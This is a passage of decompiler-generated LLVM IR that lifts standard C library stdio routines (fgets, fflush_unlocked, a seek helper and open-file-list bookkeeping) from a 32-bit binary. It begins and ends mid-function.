  store i32 %v0_805763a, i32* @eax, align 4
  %v1_805763f = load i32, i32* @ebp, align 4
  %v2_805763f = add i32 %v1_805763f, 52
  %v3_805763f = inttoptr i32 %v2_805763f to i32*
  store i32 %v0_805763a, i32* %v3_805763f, align 4
  br i1 %v5_805762a, label %dec_label_pc_80576b1, label %dec_label_pc_8057644

dec_label_pc_8057644:                             ; preds = %dec_label_pc_805761c
  %v2_805764f = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_805764f, i32* %stack_var_-76, align 4
  %v2_8057654 = call i32 @__pthread_return_void(i32 %v2_805764f, i32 134567199)
  store i32 %v2_8057654, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805f278.923 to i32), i32* %stack_var_-76, align 4
  %v1_8057660 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805f278.923 to i32))
  store i32 %v1_8057660, i32* @eax, align 4
  %v2_8057672 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_8057672, i32* %stack_var_-76, align 4
  %v2_8057677 = call i32 @__pthread_return_void(i32 %v2_8057672, i32 134567199)
  store i32 %v2_8057677, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805f260.922 to i32), i32* %stack_var_-76, align 4
  %v1_8057683 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805f260.922 to i32))
  %v0_8057688 = load i32, i32* bitcast (i32** @global_var_805f25c.924 to i32*), align 4
  store i32 %v0_8057688, i32* @eax, align 4
  %v1_805768d = load i32, i32* @ebp, align 4
  %v2_805768d = add i32 %v1_805768d, 32
  %v3_805768d = inttoptr i32 %v2_805768d to i32*
  store i32 %v0_8057688, i32* %v3_805768d, align 4
  %v2_8057690 = load i32, i32* %stack_var_-76, align 4
  store i32 %v2_8057690, i32* @ecx, align 4
  %v0_8057691 = load i32, i32* @ebp, align 4
  store i32 %v0_8057691, i32* bitcast (i32** @global_var_805f25c.924 to i32*), align 4
  store i32 %v2_8057672, i32* %stack_var_-76, align 4
  %v2_805769b = call i32 @__pthread_return_void(i32 %v2_8057672, i32 1)
  store i32 %v2_8057672, i32* @eax, align 4
  store i32 1, i32* @edx, align 4
  store i32 %v2_805764f, i32* %stack_var_-76, align 4
  %v2_80576a5 = call i32 @__pthread_return_void(i32 %v2_805764f, i32 1)
  br label %dec_label_pc_80576aa

dec_label_pc_80576aa:                             ; preds = %dec_label_pc_80574c3, %dec_label_pc_8057644
  %storemerge = phi i32 [ %v2_80576a5, %dec_label_pc_8057644 ], [ %v1_80574c9, %dec_label_pc_80574c3 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80576b1

dec_label_pc_80576af:                             ; preds = %dec_label_pc_80574b9, %dec_label_pc_80574a6
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_80576b1

dec_label_pc_80576b1:                             ; preds = %dec_label_pc_805761c, %dec_label_pc_80574f2, %dec_label_pc_80576aa, %dec_label_pc_80576af
  %v0_80576b4 = load i32, i32* @ebp, align 4
  store i32 %v0_80576b4, i32* %eax.global-to-local, align 4
  %v2_80576b6 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80576b6, i32* @ebx, align 4
  store i32 %v0_805747a, i32* @esi, align 4
  store i32 %v0_8057479, i32* @edi, align 4
  store i32 %v0_8057478, i32* @ebp, align 4
  ret i32 %v0_80576b4

; uselistorder directives
  uselistorder i32 %v2_8057672, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v2_805764f, { 1, 0, 3, 2 }
  uselistorder i32 %v2_8057609, { 1, 0 }
  uselistorder i32 %v1_80575f2, { 0, 2, 1, 3 }
  uselistorder i32 %v2_80575d9, { 1, 0 }
  uselistorder i32 %v1_80575be, { 1, 0, 2 }
  uselistorder i32 %v11_8057573, { 1, 0 }
  uselistorder i32 %v1_8057545, { 1, 0 }
  uselistorder i32 %v0_8057541, { 1, 0 }
  uselistorder i32 %v2_8057577, { 1, 0, 2 }
  uselistorder i32 %v1_80574f7, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %stack_var_-76, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13, 14 }
  uselistorder i32* %eax.global-to-local, { 1, 27, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 13, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 0, 25, 26 }
  uselistorder i32 191, { 0, 2, 1 }
  uselistorder i32 4096, { 20, 9, 18, 4, 21, 5, 6, 22, 23, 7, 19, 10, 12, 11, 1, 13, 15, 14, 2, 17, 16, 3, 0, 8 }
  uselistorder i32 (i32)* @isatty, { 2, 1, 0 }
  uselistorder i32 (i8*, i32)* @__libc_open, { 2, 5, 0, 1, 3, 4 }
  uselistorder i32 32768, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @__libc_fcntl, { 1, 0, 9, 8, 7, 6, 13, 12, 11, 10, 5, 4, 3, 2 }
  uselistorder i32 1024, { 4, 2, 3, 0, 24, 5, 7, 6, 25, 9, 8, 1, 10, 11, 18, 19, 20, 21, 12, 22, 23, 14, 15, 16, 13, 17 }
  uselistorder i32 (i32)* @__stdio_init_mutex, { 3, 2, 1, 0, 4 }
  uselistorder i8 43, { 0, 2, 1 }
  uselistorder i32 22, { 8, 9, 14, 3, 4, 5, 6, 7, 13, 12, 10, 11, 15, 1, 2, 0 }
  uselistorder i32 577, { 0, 2, 1 }
  uselistorder i32 %arg4, { 3, 1, 0, 2, 4, 5 }
  uselistorder label %dec_label_pc_80576b1, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_80576aa, { 1, 0 }
  uselistorder label %dec_label_pc_805761c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8057567, { 1, 0 }
  uselistorder label %dec_label_pc_8057524, { 1, 0 }
  uselistorder label %dec_label_pc_80574ee, { 1, 0 }
  uselistorder label %dec_label_pc_80574d5, { 2, 0, 1 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %tmp5 = ptrtoint i32* %arg2 to i32
  store i32 %tmp5, i32* @ebx, align 4
  %v1_80576c8 = add i32 %tmp5, 4
  %v2_80576c8 = inttoptr i32 %v1_80576c8 to i32*
  %v3_80576c8 = load i32, i32* %v2_80576c8, align 4
  %v2_80576cb = load i32, i32* %arg2, align 4
  %v1_80576d1 = add i32 %arg1, 4
  %v2_80576d1 = inttoptr i32 %v1_80576d1 to i32*
  %v3_80576d1 = load i32, i32* %v2_80576d1, align 4
  %v4_80576d4 = call i32 @__libc_lseek64(i32 %v3_80576d1, i32 %v2_80576cb, i32 %v3_80576c8, i32 %arg3)
  %v0_80576dc = load i32, i32* @edx, align 4
  %v2_80576dc = icmp slt i32 %v0_80576dc, 0
  store i32 %v4_80576d4, i32* %ecx.global-to-local, align 4
  br i1 %v2_80576dc, label %dec_label_pc_80576e9, label %dec_label_pc_80576e2

dec_label_pc_80576e2:                             ; preds = %entry
  %v1_80576e2 = load i32, i32* @ebx, align 4
  %v2_80576e2 = inttoptr i32 %v1_80576e2 to i32*
  store i32 %v4_80576d4, i32* %v2_80576e2, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v0_80576e6 = load i32, i32* @edx, align 4
  %v1_80576e6 = load i32, i32* @ebx, align 4
  %v2_80576e6 = add i32 %v1_80576e6, 4
  %v3_80576e6 = inttoptr i32 %v2_80576e6 to i32*
  store i32 %v0_80576e6, i32* %v3_80576e6, align 4
  %v0_80576ea.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80576e9

dec_label_pc_80576e9:                             ; preds = %entry, %dec_label_pc_80576e2
  %v0_80576ea = phi i32 [ %v4_80576d4, %entry ], [ %v0_80576ea.pre, %dec_label_pc_80576e2 ]
  ret i32 %v0_80576ea

; uselistorder directives
  uselistorder i32 %tmp5, { 1, 0 }
  uselistorder label %dec_label_pc_80576e9, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_80576f0 = load i32, i32* @edi, align 4
  %v0_80576f1 = load i32, i32* @esi, align 4
  %v0_80576f2 = load i32, i32* @ebx, align 4
  %v12_80576f3 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %arg3, i32* @esi, align 4
  %v1_80576fa = add i32 %arg3, 52
  %v2_80576fa = inttoptr i32 %v1_80576fa to i32*
  %v3_80576fa = load i32, i32* %v2_80576fa, align 4
  store i32 %v3_80576fa, i32* @edi, align 4
  %v1_80576fd = icmp eq i32 %v3_80576fa, 0
  %v1_80576ff = icmp eq i1 %v1_80576fd, false
  br i1 %v1_80576ff, label %entry.dec_label_pc_8057720_crit_edge, label %dec_label_pc_8057701

entry.dec_label_pc_8057720_crit_edge:             ; preds = %entry
  br label %dec_label_pc_8057720

dec_label_pc_8057701:                             ; preds = %entry
  %v1_8057701 = add i32 %arg3, 56
  store i32 %v1_8057701, i32* @ebx, align 4
  store i32 %v12_80576f3, i32* @eax, align 4
  %v2_8057710 = call i32 @__pthread_return_void(i32 %v12_80576f3, i32 134567199)
  %v0_8057715 = load i32, i32* @ebx, align 4
  %v1_8057718 = call i32 @__pthread_return_0(i32 %v0_8057715)
  %v0_8057721.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8057720

dec_label_pc_8057720:                             ; preds = %entry.dec_label_pc_8057720_crit_edge, %dec_label_pc_8057701
  %v0_8057721 = phi i32 [ %arg3, %entry.dec_label_pc_8057720_crit_edge ], [ %v0_8057721.pre, %dec_label_pc_8057701 ]
  %v0_8057720 = load i32, i32* @edx, align 4
  %v4_805772a = inttoptr i32 %arg1 to i8*
  %v5_805772a = call i32 @__GI_fgets_unlocked(i8* %v4_805772a, i32 %arg2, i32 %v0_8057721, i32 %v0_8057720)
  store i32 %v5_805772a, i32* %ebx.global-to-local, align 4
  br i1 %v1_80576ff, label %dec_label_pc_8057749, label %dec_label_pc_8057738

dec_label_pc_8057738:                             ; preds = %dec_label_pc_8057720
  store i32 %v12_80576f3, i32* @eax, align 4
  %v2_8057741 = call i32 @__pthread_return_void(i32 %v12_80576f3, i32 1)
  %v0_805774c.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8057749

dec_label_pc_8057749:                             ; preds = %dec_label_pc_8057720, %dec_label_pc_8057738
  %v0_805774c = phi i32 [ %v5_805772a, %dec_label_pc_8057720 ], [ %v0_805774c.pre, %dec_label_pc_8057738 ]
  store i32 %v0_80576f2, i32* @ebx, align 4
  store i32 %v0_80576f1, i32* @esi, align 4
  store i32 %v0_80576f0, i32* @edi, align 4
  ret i32 %v0_805774c

; uselistorder directives
  uselistorder i32 %v12_80576f3, { 2, 3, 0, 1 }
  uselistorder i32 52, { 6, 7, 8, 9, 1, 10, 2, 3, 4, 5, 13, 14, 11, 12, 15, 0 }
  uselistorder i32 %arg3, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8057749, { 1, 0 }
  uselistorder label %dec_label_pc_8057720, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v2_8057763 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8057763, i32* @eax, align 4
  %v2_8057768 = call i32 @__pthread_return_void(i32 %v2_8057763, i32 134567199)
  %v1_8057774 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805f278.923 to i32))
  %v0_8057779 = load i32, i32* @global_var_8063504.1029, align 4
  %v8_8057781 = icmp eq i32 %v0_8057779, 1
  %v1_8057782 = icmp eq i1 %v8_8057781, false
  br i1 %v1_8057782, label %dec_label_pc_8057819, label %dec_label_pc_8057788

dec_label_pc_8057788:                             ; preds = %entry
  %v0_8057788 = load i32, i32* @global_var_8063508.1030, align 8
  %tmp29 = icmp slt i32 %v0_8057788, 1
  br i1 %tmp29, label %dec_label_pc_8057819, label %dec_label_pc_8057795

dec_label_pc_8057795:                             ; preds = %dec_label_pc_8057788
  store i32 0, i32* @esi, align 4
  %v2_80577a2 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_80577a2, i32* @eax, align 4
  %v2_80577a7 = call i32 @__pthread_return_void(i32 %v2_80577a2, i32 134567199)
  %v1_80577b3 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805f260.922 to i32))
  %v0_80577b8 = load i32, i32* bitcast (i32** @global_var_805f25c.924 to i32*), align 4
  store i32 %v0_80577b8, i32* %edx.global-to-local, align 4
  %v1_80577fa3 = icmp eq i32 %v0_80577b8, 0
  %v1_80577fc10 = icmp eq i1 %v1_80577fa3, false
  br i1 %v1_80577fc10, label %dec_label_pc_80577c3, label %dec_label_pc_80577fe

dec_label_pc_80577c3:                             ; preds = %dec_label_pc_8057795, %dec_label_pc_80577f8
  %v1_80577c314.in = phi i32 [ %v0_80577f8, %dec_label_pc_80577f8 ], [ %v0_80577b8, %dec_label_pc_8057795 ]
  %v1_80577c314 = inttoptr i32 %v1_80577c314.in to i16*
  %v2_80577c3 = load i16, i16* %v1_80577c314, align 2
  %v1_80577c6 = add i32 %v1_80577c314.in, 32
  %v2_80577c6 = inttoptr i32 %v1_80577c6 to i32*
  %v3_80577c6 = load i32, i32* %v2_80577c6, align 4
  store i32 %v3_80577c6, i32* @ebx, align 4
  %v1_80577c9 = and i16 %v2_80577c3, -32720
  %v6_80577ce = icmp eq i16 %v1_80577c9, 48
  br i1 %v6_80577ce, label %dec_label_pc_80577d7, label %dec_label_pc_80577d3

dec_label_pc_80577d3:                             ; preds = %dec_label_pc_80577c3
  store i32 %v1_80577c314.in, i32* @esi, align 4
  br label %dec_label_pc_80577f8

dec_label_pc_80577d7:                             ; preds = %dec_label_pc_80577c3
  %v0_80577d7 = load i32, i32* @esi, align 4
  %v1_80577d7 = icmp eq i32 %v0_80577d7, 0
  %v1_80577d9 = icmp eq i1 %v1_80577d7, false
  br i1 %v1_80577d9, label %dec_label_pc_80577e3, label %dec_label_pc_80577db

dec_label_pc_80577db:                             ; preds = %dec_label_pc_80577d7
  store i32 %v3_80577c6, i32* bitcast (i32** @global_var_805f25c.924 to i32*), align 4
  br label %dec_label_pc_80577e6

dec_label_pc_80577e3:                             ; preds = %dec_label_pc_80577d7
  %v2_80577e3 = add i32 %v0_80577d7, 32
  %v3_80577e3 = inttoptr i32 %v2_80577e3 to i32*
  store i32 %v3_80577c6, i32* %v3_80577e3, align 4
  %v0_80577e6.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80577e6

dec_label_pc_80577e6:                             ; preds = %dec_label_pc_80577db, %dec_label_pc_80577e3
  %v0_80577ef = phi i32 [ %v1_80577c314.in, %dec_label_pc_80577db ], [ %v0_80577e6.pre, %dec_label_pc_80577e3 ]
  %v1_80577e6 = add i32 %v0_80577ef, 1
  %v2_80577e6 = inttoptr i32 %v1_80577e6 to i8*
  %v3_80577e6 = load i8, i8* %v2_80577e6, align 1
  %v4_80577e6 = and i8 %v3_80577e6, 32
  %v5_80577e6 = icmp eq i8 %v4_80577e6, 0
  br i1 %v5_80577e6, label %dec_label_pc_80577f8, label %dec_label_pc_80577ec

dec_label_pc_80577ec:                             ; preds = %dec_label_pc_80577e6
  %v1_80577f0 = call i32 @free(i32 %v0_80577ef)
  br label %dec_label_pc_80577f8

dec_label_pc_80577f8:                             ; preds = %dec_label_pc_80577e6, %dec_label_pc_80577d3, %dec_label_pc_80577ec
  %v0_80577f8 = load i32, i32* @ebx, align 4
  store i32 %v0_80577f8, i32* %edx.global-to-local, align 4
  %v1_80577fa = icmp eq i32 %v0_80577f8, 0
  %v1_80577fc = icmp eq i1 %v1_80577fa, false
  br i1 %v1_80577fc, label %dec_label_pc_80577c3, label %dec_label_pc_80577fe

dec_label_pc_80577fe:                             ; preds = %dec_label_pc_80577f8, %dec_label_pc_8057795
  store i32 %v2_80577a2, i32* @eax, align 4
  %v2_8057807 = call i32 @__pthread_return_void(i32 %v2_80577a2, i32 1)
  store i32 0, i32* @global_var_8063508.1030, align 8
  %v0_8057819.pre = load i32, i32* @global_var_8063504.1029, align 4
  br label %dec_label_pc_8057819

dec_label_pc_8057819:                             ; preds = %dec_label_pc_8057788, %entry, %dec_label_pc_80577fe
  %v0_8057819 = phi i32 [ %v0_8057779, %dec_label_pc_8057788 ], [ %v0_8057779, %entry ], [ %v0_8057819.pre, %dec_label_pc_80577fe ]
  %v1_805781e = add i32 %v0_8057819, -1
  store i32 %v1_805781e, i32* @global_var_8063504.1029, align 4
  store i32 %v2_8057763, i32* @eax, align 4
  %v2_805782d = call i32 @__pthread_return_void(i32 %v2_8057763, i32 1)
  ret i32 %v2_805782d

; uselistorder directives
  uselistorder i32 %v0_80577f8, { 1, 2, 0 }
  uselistorder i32 %v1_80577c314.in, { 2, 1, 0, 3 }
  uselistorder i32 %v0_8057779, { 1, 2, 0 }
  uselistorder i32 (i32)* @free, { 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 1, 6, 5, 4, 3, 2, 21, 20, 7, 19, 0 }
  uselistorder label %dec_label_pc_8057819, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80577f8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80577e6, { 1, 0 }
  uselistorder label %dec_label_pc_80577c3, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %v0_8057838 = load i32, i32* @ebp, align 4
  store i32 0, i32* @ebp, align 4
  %v0_805783b = load i32, i32* @edi, align 4
  %v0_805783c = load i32, i32* @esi, align 4
  %v0_805783d = load i32, i32* @ebx, align 4
  %v4_8057841 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8057841, i32* @ebx, align 4
  %v10_8057845 = icmp eq i16* %arg1, inttoptr (i32 134607452 to i16*)
  br i1 %v10_8057845, label %dec_label_pc_8057859, label %dec_label_pc_805784d

dec_label_pc_805784d:                             ; preds = %entry
  %v2_805784d = icmp eq i16* %arg1, null
  store i32 256, i32* @ebp, align 4
  %v1_8057853 = icmp eq i1 %v2_805784d, false
  br i1 %v1_8057853, label %dec_label_pc_8057951, label %dec_label_pc_8057859

dec_label_pc_8057859:                             ; preds = %dec_label_pc_805784d, %entry
  store i32 0, i32* @edi, align 4
  %v2_8057866 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8057866, i32* @ebx, align 4
  %v2_805786b = call i32 @__pthread_return_void(i32 %v2_8057866, i32 134567199)
  %v1_8057877 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805f278.923 to i32))
  %v0_805787c = load i32, i32* @global_var_8063504.1029, align 4
  store i32 ptrtoint (i32* @global_var_805f278.923 to i32), i32* @ecx, align 4
  %v1_8057883 = add i32 %v0_805787c, 1
  store i32 %v1_8057883, i32* @eax, align 4
  store i32 %v1_8057883, i32* @global_var_8063504.1029, align 4
  %v2_805788c = call i32 @__pthread_return_void(i32 %v2_8057866, i32 1)
  store i32 %v2_805788c, i32* @eax, align 4
  %v2_805789f = call i32 @__pthread_return_void(i32 %v2_8057866, i32 134567199)
  %v1_80578ab = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805f260.922 to i32))
  %v0_80578b0 = load i32, i32* bitcast (i32** @global_var_805f25c.924 to i32*), align 4
  store i32 %v0_80578b0, i32* @esi, align 4
  store i32 ptrtoint (i32* @global_var_805f260.922 to i32), i32* @eax, align 4
  %v2_80578bb = call i32 @__pthread_return_void(i32 %v2_8057866, i32 1)
  %v0_80579421 = load i32, i32* @esi, align 4
  %v1_80579422 = icmp eq i32 %v0_80579421, 0
  %v1_80579449 = icmp eq i1 %v1_80579422, false
  br i1 %v1_80579449, label %dec_label_pc_80578c5, label %dec_label_pc_805794a

dec_label_pc_80578c5:                             ; preds = %dec_label_pc_8057859, %dec_label_pc_805793f
  %v0_80578d3 = phi i32 [ %v3_805793f, %dec_label_pc_805793f ], [ %v0_80579421, %dec_label_pc_8057859 ]
  %v1_80578c5 = inttoptr i32 %v0_80578d3 to i8*
  %v2_80578c5 = load i8, i8* %v1_80578c5, align 1
  %v3_80578c5 = and i8 %v2_80578c5, 64
  %v4_80578c5 = icmp eq i8 %v3_80578c5, 0
  br i1 %v4_80578c5, label %dec_label_pc_805793f, label %dec_label_pc_80578ca

dec_label_pc_80578ca:                             ; preds = %dec_label_pc_80578c5
  %v0_80578ca = load i32, i32* @global_var_805f290.1031, align 16
  %v9_80578ca = icmp eq i32 %v0_80578ca, 2
  br i1 %v9_80578ca, label %dec_label_pc_80578f2, label %dec_label_pc_80578d3

dec_label_pc_80578d3:                             ; preds = %dec_label_pc_80578ca
  %v1_80578d3 = add i32 %v0_80578d3, 56
  store i32 %v1_80578d3, i32* @ebx, align 4
  store i32 %v2_8057866, i32* @eax, align 4
  %v2_80578e2 = call i32 @__pthread_return_void(i32 %v2_8057866, i32 134567199)
  %v0_80578e7 = load i32, i32* @ebx, align 4
  %v1_80578ea = call i32 @__pthread_return_0(i32 %v0_80578e7)
  %v0_80578f2.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80578f2

dec_label_pc_80578f2:                             ; preds = %dec_label_pc_80578ca, %dec_label_pc_80578d3
  %v0_8057905 = phi i32 [ %v0_80578d3, %dec_label_pc_80578ca ], [ %v0_80578f2.pre, %dec_label_pc_80578d3 ]
  %v1_80578f2 = inttoptr i32 %v0_8057905 to i32*
  %v2_80578f2 = load i32, i32* %v1_80578f2, align 4
  %v1_80578f4 = load i32, i32* @ebp, align 4
  %v2_80578f4 = or i32 %v1_80578f4, %v2_80578f2
  %v1_80578f6 = and i32 %v2_80578f4, 832
  %v2_80578fb = icmp eq i32 %v1_80578f6, 320
  %v1_8057900 = icmp eq i1 %v2_80578fb, false
  br i1 %v1_8057900, label %dec_label_pc_8057925, label %dec_label_pc_8057902

dec_label_pc_8057902:                             ; preds = %dec_label_pc_80578f2
  %v1_8057906 = call i32 @__stdio_wcommit(i32 %v0_8057905)
  %v1_805790e = icmp eq i32 %v1_8057906, 0
  br i1 %v1_805790e, label %dec_label_pc_8057917, label %dec_label_pc_8057912

dec_label_pc_8057912:                             ; preds = %dec_label_pc_8057902
  store i32 -1, i32* @edi, align 4
  br label %dec_label_pc_8057925

dec_label_pc_8057917:                             ; preds = %dec_label_pc_8057902
  %v0_8057917 = load i32, i32* @esi, align 4
  %v1_8057917 = add i32 %v0_8057917, 8
  %v2_8057917 = inttoptr i32 %v1_8057917 to i32*
  %v3_8057917 = load i32, i32* %v2_8057917, align 4
  %v2_805791a = add i32 %v0_8057917, 28
  %v3_805791a = inttoptr i32 %v2_805791a to i32*
  store i32 %v3_8057917, i32* %v3_805791a, align 4
  %v0_805791d = load i32, i32* @esi, align 4
  %v1_805791d = inttoptr i32 %v0_805791d to i32*
  %v2_805791d = load i32, i32* %v1_805791d, align 4
  %v2_805791d.tr = trunc i32 %v2_805791d to i16
  %v1_8057922 = and i16 %v2_805791d.tr, -65
  %v3_8057922 = inttoptr i32 %v0_805791d to i16*
  store i16 %v1_8057922, i16* %v3_8057922, align 2
  br label %dec_label_pc_8057925

dec_label_pc_8057925:                             ; preds = %dec_label_pc_80578f2, %dec_label_pc_8057912, %dec_label_pc_8057917
  %v0_8057925 = load i32, i32* @global_var_805f290.1031, align 16
  %v9_8057925 = icmp eq i32 %v0_8057925, 2
  br i1 %v9_8057925, label %dec_label_pc_805793f, label %dec_label_pc_805792e

dec_label_pc_805792e:                             ; preds = %dec_label_pc_8057925
  store i32 %v2_8057866, i32* @eax, align 4
  %v2_8057937 = call i32 @__pthread_return_void(i32 %v2_8057866, i32 1)
  br label %dec_label_pc_805793f

dec_label_pc_805793f:                             ; preds = %dec_label_pc_8057925, %dec_label_pc_80578c5, %dec_label_pc_805792e
  %v0_805793f = load i32, i32* @esi, align 4
  %v1_805793f = add i32 %v0_805793f, 32
  %v2_805793f = inttoptr i32 %v1_805793f to i32*
  %v3_805793f = load i32, i32* %v2_805793f, align 4
  store i32 %v3_805793f, i32* @esi, align 4
  %v1_8057942 = icmp eq i32 %v3_805793f, 0
  %v1_8057944 = icmp eq i1 %v1_8057942, false
  br i1 %v1_8057944, label %dec_label_pc_80578c5, label %dec_label_pc_805794a

dec_label_pc_805794a:                             ; preds = %dec_label_pc_805793f, %dec_label_pc_8057859
  %v0_805794a = call i32 @_stdio_openlist_dec_use()
  br label %dec_label_pc_805797b

dec_label_pc_8057951:                             ; preds = %dec_label_pc_805784d
  store i32 0, i32* @edi, align 4
  %tmp23 = bitcast i16* %arg1 to i8*
  %v3_8057953 = load i8, i8* %tmp23, align 1
  %v4_8057953 = and i8 %v3_8057953, 64
  %v5_8057953 = icmp eq i8 %v4_8057953, 0
  br i1 %v5_8057953, label %dec_label_pc_805797b, label %dec_label_pc_8057958

dec_label_pc_8057958:                             ; preds = %dec_label_pc_8057951
  store i32 -1, i32* @edi, align 4
  %v1_805795f = call i32 @__stdio_wcommit(i32 %v4_8057841)
  %v1_8057967 = icmp eq i32 %v1_805795f, 0
  %v1_8057969 = icmp eq i1 %v1_8057967, false
  br i1 %v1_8057969, label %dec_label_pc_805797b, label %dec_label_pc_805796b

dec_label_pc_805796b:                             ; preds = %dec_label_pc_8057958
  %v2_805796b = add i32 %v4_8057841, 8
  %v3_805796b = inttoptr i32 %v2_805796b to i32*
  %v4_805796b = load i32, i32* %v3_805796b, align 4
  store i32 0, i32* @edi, align 4
  %v3_8057970 = add i32 %v4_8057841, 28
  %v4_8057970 = inttoptr i32 %v3_8057970 to i32*
  store i32 %v4_805796b, i32* %v4_8057970, align 4
  %tmp24 = bitcast i16* %arg1 to i32*
  %v3_8057973 = load i32, i32* %tmp24, align 4
  %v3_8057973.tr = trunc i32 %v3_8057973 to i16
  %v1_8057978 = and i16 %v3_8057973.tr, -65
  store i16 %v1_8057978, i16* %arg1, align 2
  br label %dec_label_pc_805797b

dec_label_pc_805797b:                             ; preds = %dec_label_pc_8057958, %dec_label_pc_8057951, %dec_label_pc_805794a, %dec_label_pc_805796b
  %v0_805797e = load i32, i32* @edi, align 4
  store i32 %v0_805783d, i32* @ebx, align 4
  store i32 %v0_805783c, i32* @esi, align 4
  store i32 %v0_805783b, i32* @edi, align 4
  store i32 %v0_8057838, i32* @ebp, align 4
  ret i32 %v0_805797e

; uselistorder directives
  uselistorder i32 %v3_805793f, { 1, 2, 0 }
  uselistorder i32 %v2_8057866, { 2, 3, 0, 1, 4, 5, 6, 7, 8 }
  uselistorder i32 ()* @_stdio_openlist_dec_use, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_805f25c.924 to i32*), { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_805f260.922 to i32), { 0, 1, 2, 3, 5, 4 }
  uselistorder i32* @global_var_8063504.1029, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 (i32)* @__pthread_return_0, { 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 3, 29, 31, 30, 9, 2, 1, 0, 6, 5, 7, 8, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_805f278.923 to i32), { 1, 3, 4, 5, 9, 2, 6, 0, 7, 8 }
  uselistorder i32 (i32, i32)* @__pthread_return_void, { 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 1, 0, 51, 50, 55, 54, 53, 52, 11, 10, 5, 4, 3, 2, 7, 6, 9, 8 }
  uselistorder i32 134567199, { 18, 19, 2, 20, 3, 4, 21, 22, 5, 23, 6, 7, 8, 25, 26, 27, 28, 29, 30, 0, 9, 10, 11, 12, 13, 14, 15, 16, 1, 24, 17 }
  uselistorder i16* %arg1, { 4, 3, 1, 2, 0, 5 }
  uselistorder label %dec_label_pc_805797b, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_805793f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8057925, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80578f2, { 1, 0 }
  uselistorder label %dec_label_pc_80578c5, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %v0_8057988 = load i32, i32* @ebp, align 4
  %v4_8057993 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8057993, i32* @edi, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %v4_8057993, i32* @ebx, align 4
  %tmp17 = icmp slt i32 %arg2, 1
  %tmp18 = icmp eq i1 %tmp17, false
  br i1 %tmp18, label %dec_label_pc_80579d9.preheader, label %dec_label_pc_80579e5

dec_label_pc_80579d9.preheader:                   ; preds = %entry
  %v1_80579d919 = add i32 %arg2, -1
  %v8_80579d923 = icmp eq i32 %v1_80579d919, 0
  store i32 %v1_80579d919, i32* @esi, align 4
  %v1_80579da25 = icmp eq i1 %v8_80579d923, false
  br i1 %v1_80579da25, label %dec_label_pc_80579a3, label %dec_label_pc_80579dc

dec_label_pc_80579a3:                             ; preds = %dec_label_pc_80579d9.preheader, %dec_label_pc_80579d7.dec_label_pc_80579d9_crit_edge.dec_label_pc_80579a3_crit_edge
